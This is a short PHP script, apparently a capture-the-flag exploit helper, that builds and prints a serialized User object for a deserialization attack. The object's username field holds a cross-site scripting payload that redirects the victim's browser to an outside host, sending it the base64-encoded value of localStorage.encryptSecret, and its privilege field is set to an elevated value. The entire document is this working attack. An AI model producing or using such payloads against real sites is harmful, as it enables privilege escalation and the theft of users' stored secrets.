<?php
class User {
    public $username = "<script>document.location = 'http://hax.perfect.blue/?leek='+ btoa(localStorage.encryptSecret);</script>";
    public $password = "$2y$10$2qeN1gE3E8VhV2ZcdLiKM.7JBC3tCVYQh5QW7L1G1Oj2HlX6v8LPG";
    public $privs = 15;
    public $id = "1";
}

echo serialize(new User());
